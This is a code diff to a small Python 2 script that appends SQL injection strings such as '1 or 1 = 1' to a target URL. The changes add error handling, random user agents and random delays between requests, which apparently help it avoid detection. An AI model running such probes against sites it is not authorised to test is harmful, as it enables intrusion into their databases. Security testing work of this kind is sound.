@@ -6,9 +6,12 @@ import sys
 import argparse
 import random
 import pdb
+import time
 
 def sqli_test(url, payload=None):
-	"""payload needs to be a well formed dict"""
+	"""Runs a GET of an url
+	using random user agents
+	payload needs to be a well formed dict"""
 	result = -1
 	user_agent_list = ['Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko']	
 	user_agent = user_agent_list[random.randint(0,1)]
@@ -48,7 +51,7 @@ url = args.t
 sqli = args.s
 
 #SQLI tests
-sqli_list = [ "1 order by 1", "1 or 1 = 1", "jerry or 1 =1"]
+sqli_list = [ "1 order by 1", "jerry or 1 =1" ]
 
 if __name__ == "__main__":
 	
@@ -61,13 +64,25 @@ if __name__ == "__main__":
 		print G + "[+] INFO: Trying {}".format(fullurl) + W
 		result = sqli_test(fullurl)
 		print G + "[+] INFO: Output is: " +W
-		print result.text
+		if result == -1 :
+			print R + "[!] ERROR: Could not get url" + W
+		elif result.ok:
+			print result.text
+		else:
+			print R + "[!] ERROR: Unknown error" + W	
 	
 	else:
 		for sqli in sqli_list:
+			time.sleep(random.randint(0,15))
 			fullurl = url + sqli
+			print fullurl
 			print G + "[+] INFO: Trying {}".format(fullurl) + W
 			result = sqli_test(fullurl)
 			print G + "[+] INFO: Output is:" +W
-			print result.text
+			if result == -1 :
+				print R + "[!] ERROR: Could not get url" + W
+			elif result.ok:
+				print result.text
+			else:
+				print R +"[!] ERROR: Unknown error" + W
 
